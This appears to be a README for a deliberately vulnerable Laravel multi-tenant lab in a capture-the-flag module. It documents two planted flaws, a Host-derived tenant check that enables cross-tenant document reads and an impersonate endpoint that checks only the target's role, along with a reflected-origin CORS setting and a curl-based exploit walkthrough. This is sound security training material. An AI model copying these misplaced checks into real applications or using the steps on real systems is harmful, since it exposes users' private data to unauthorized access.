# ASLV M3 — `aslv-app` (Laravel 11 tenant app)

VLH-CTF **M3**: the business application of the ASLV organization. A PHP 8.3 /
Laravel 11 skeleton behind per-tenant subdomains (`<tenant>.aslv.lab`), holding
the two **resource-resident** flags of the module:

| Flag | Archetype | Where it lives | How it is meant to fall |
|---|---|---|---|
| `ASLV{IDOR-<digits>}` | resource-resident | the innocent's private document | cross-tenant read via `/api/documents/{uuid}` (misplaced tenant check) |
| `ASLV{BAC-<digits>}` | resource-resident | the admin-only document | `GET /admin/users/impersonate` (misplaced role check) |

Flags are minted fresh on **every container start** (see *Operations*), never
hardcoded, never in env vars, never client-side. Both are registered in the
flag registry (`/registry/flags.ndjson`, unit `m3`, note `held`).

## Endpoints

| Method | Path | Auth | Notes |
|---|---|---|---|
| GET | `/` | — | welcome / login form (tenant-aware) |
| GET | `/login` | — | same form; authed users are redirected to `/dashboard` |
| POST | `/login` | — | session login (`username` + `password`, CSRF-protected form) |
| POST | `/logout` | — | logout (CSRF-protected form) |
| GET | `/dashboard` | session | own documents (uuid/title/tenant) + own tickets |
| GET | `/support/tickets` | session | **legitimate leak point** — the support desk shows *every* ticket; the innocent's seeded ticket references her document URL and her tenant subdomain |
| GET | `/admin/users` | session + `role=admin` | full user directory — the *properly gated* vertical wall (testers get 403) |
| GET | `/admin/users/impersonate?user_id=<id\|username>` | session only | **the M3 BAC bypass** — MISPLACED check: verifies the *target* is an admin, never the caller |
| GET | `/api/documents` | session | own documents only (the correct ownership check — the shortcut test) |
| GET | `/api/documents/{uuid}` | session | **the M3 IDOR** — MISPLACED check: `document.tenant` is compared against the *Host-derived* tenant, not the session owner |
| OPTIONS | `/api/**` | — | preflight surface for the reflected-CORS edge |
| GET | `/internal/activity` | none (infra) | NDJSON activity tail (TUI polls it via the collector vhost; unreachable in full mode) |

Session authentication is shared between the web UI and `/api/*`: the api
group runs the stateful stack (cookies + `StartSession`), so the login cookie
authorizes `GET /api/documents/...` directly.

## Seeded accounts

| Username | Password | Role | Notes |
|---|---|---|---|
| `0xnhsec` | `vlh-tester-01` | tester | documented in the player guide |
| `Noshiro` | `vlh-tester-02` | tester | documented in the player guide |
| `usr_<4 hex>` | *random 16 chars* | innocent | password lives only in `/data/seed.json` inside the container — never in player scope |
| `admin` | *random* | admin | same — `/data/seed.json` only |

The innocent's `api_key` (32 hex) is likewise seed-only material. `/data/seed.json`
is container-internal (grading/ops) and no route serves it.

## How tenant resolution works

`ResolveTenant` (web + api groups) parses the `Host` header: any request to
`<tenant>.aslv.lab` gets `tenant=<slug>` as a request attribute (`[a-z0-9-]+`
only; `www`, `auth`, `mail`, `collector`, `attacker`, `edge`, `internal`,
`app`, `api`, `portal`, `victim`, `stub` are reserved and never tenants).
Tenant isolation is **display-level only** — the middleware never blocks
anything; both M3 vulnerabilities are *misplaced checks*, not missing ones
(that is what separates ASLV difficulty from DSLTV).

The innocent's `home_tenant` is derived exactly like M4/M5 do:
`t` + first 6 hex chars of `sha256("aslv-tenant:<username>")` — slug-safe
(needed because `usr_xxxx` contains an underscore, which the Host pattern
would never match) and consistent with the M4 pivot material.

## Intended exploit path (standalone)

1. **Log in** as a tester (any host), e.g.:
   ```sh
   curl -s -c jar -b jar http://localhost:18023/login \
        -d 'username=0xnhsec&password=vlh-tester-01' \
        -H 'X-CSRF-TOKEN: <from the login form>'   # or use a browser/agent
   ```
   (Browser play: add `127.0.0.1 <tenant>.aslv.lab` to `/etc/hosts` — the
   session cookie is scoped to `.aslv.lab` on purpose.)
2. **Read the support desk** — `GET /support/tickets` (any tenant host): the
   innocent's ticket *"Please restore my document"* leaks
   `https://<her-tenant>.aslv.lab/api/documents/<uuid>`.
3. **Cross-tenant read (IDOR)** — replay that URL with your own session while
   browsing *her* tenant subdomain:
   ```sh
   curl -s -b jar --resolve <her-tenant>.aslv.lab:18023:127.0.0.1 \
        http://<her-tenant>.aslv.lab:18023/api/documents/<uuid>
   ```
   The misplaced check compares `document.tenant === <tenant from Host>` →
   200 + body with `ASLV{IDOR-...}`, her email and the M4 pivot hint
   (`pivot: M4 /user/v1/profile leaks identifiers`).
4. **Vertical BAC** — hit the wall first, then the misplaced check:
   ```sh
   curl -s -b jar http://localhost:18023/admin/users                     # 403 — proper gate
   curl -s -b jar 'http://localhost:18023/admin/users/impersonate?user_id=admin'
   # 200 — the TARGET's role is verified, not the caller's → admin document
   # with ASLV{BAC-...}
   ```

**Shortcut tests (must stay broken):** `GET /api/documents` never lists anyone
else's documents (correct ownership check), `GET /admin/users` 403s for
non-admins, and `GET /api/documents/{uuid}` from any *other* tenant subdomain
(or the shared origin) still 403s — the check is misplaced, not absent.

## CORS (M2↔M3 trust edge)

`ReflectOriginCors` (appended to the api group) reflects any `Origin` verbatim
(`Access-Control-Allow-Origin: <origin>` + `Access-Control-Allow-Credentials:
true`) on `/api/*` responses. In full mode an exploit page on the M2 attacker
vhost can therefore read the innocent's document **cross-site with her
cookies**; in standalone it is a standalone CORS misconfiguration to explore.
`config/cors.php` ships with `paths => []` on purpose: the framework's global
`HandleCors` would otherwise stamp `Access-Control-Allow-Origin: *` over the
reflection (see the comment in that file).

## Standalone (`m3` profile) vs full mode (`full` profile)

| | m3 standalone | full mode |
|---|---|---|
| Entry | nginx sidecar on **18023** (`app-edge-std`, vhosts from `sidecar/nginx.conf.template`) | M1 gateway on **18024** (`*.aslv.lab` → `app:80`) |
| Activity feed | app's own `GET /internal/activity` via `collector.aslv.lab` (127.0.0.1:18093 for the TUI) | gateway serves `collector.aslv.lab` from the M2 portal; `/internal/*` is 404'd on every vhost that reaches this app |
| Mail | `mail.aslv.lab` → `stub-mail-3` (compose-fixed name) | `mail.aslv.lab` → MailHog |
| IDOR discovery | support ticket only | support ticket **or** the M4 pivot (innocent email/tenant/uuid leak, `pivot: M4 /user/v1/profile leaks identifiers`) |
| BAC escalation | misplaced impersonate check is the only path | misplaced check still works; the *intended* vertical escalation additionally runs through M5 (forged JWT trust edge) |
| Telemetry | local `/data/activity.jsonl` only | + `ACTIVITY_SINK=http://collector:8090/ingest` fire-and-forget |

## Operations

* **Build note**: `composer.json` sets `policy.advisories.block: false` — current
  Composer (≥ 2.10) otherwise refuses to install `laravel/framework` 11.x
  (EOL line with open advisories) and `docker compose build app` fails at the
  vendor stage. This lab is deliberately vulnerable and offline; the flag is
  not a supply-chain concern here.
* **Volumes**: `/data` (sqlite at `/data/app.db`, `flag-idor.txt`,
  `flag-bac.txt`, `seed.json`, `activity.jsonl`, registry fallback) and
  `/registry` (`flags.ndjson`).
* **Boot sequence** (`entrypoint.sh`): mkdir volumes → copy `.env.example` →
  `.env` → `artisan key:generate` if empty → write **fresh** flag values to
  `/data/flag-*.txt` → `php artisan migrate --seed --force` (the seeder wipes
  + reseeds everything, so restarts never duplicate rows or keep stale flags)
  → chown `www-data` → `apache2-foreground`.
* **Registry line** (per flag, per boot):
  `{"flag":"ASLV{IDOR-…}","category":"IDOR","unit":"m3","archetype":"resource-resident","minted_at":"…","note":"held"}`
  appended to `/registry/flags.ndjson`, falling back to
  `/data/registry-fallback.ndjson` when the registry volume is not writable.
* **Full-mode chain sync** (optional): the seeder honors `INNOCENT_USERNAME`,
  `INNOCENT_PASSWORD`, `INNOCENT_API_KEY`, `INNOCENT_UUID` (same names as
  aslv-api M4) plus `INNOCENT_DOC_UUID`, so the integration layer can keep the
  innocent identical across modules and make the M4→M3 UUID pivot land on a
  real document uuid.
* **DB**: module-local sqlite (both modes) — `DB_DATABASE=/data/app.db`,
  `SESSION_DRIVER=database` (sessions table), `CACHE_STORE=file`.
* **Logs**: `LOG_CHANNEL=stderr` (`docker logs app-std`).
* Non-secret runtime env: `LAB_DOMAIN` (default `aslv.lab`), `STANDALONE`
  (marker set by compose in standalone), `ACTIVITY_SINK` (full mode).
